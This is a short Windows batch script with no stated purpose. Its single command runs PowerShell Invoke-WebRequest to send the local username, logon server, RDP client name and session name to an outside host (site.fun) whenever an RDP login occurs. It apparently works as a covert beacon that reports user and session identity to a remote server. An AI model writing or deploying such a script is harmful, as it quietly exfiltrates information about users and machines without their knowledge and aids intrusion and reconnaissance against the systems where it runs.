@echo off

powershell.exe -noprofile -command "Invoke-WebRequest -Uri http://site.fun/?data=tok321_DedicName:123123123@ACTION:Rdp-Login@@LocalUser:%USERNAME%@WinDOMAIN:%LOGONSERVER%@@RemotePcUsername:%CLIENTNAME%@RdpSessionName:%SESSIONNAME%"

exit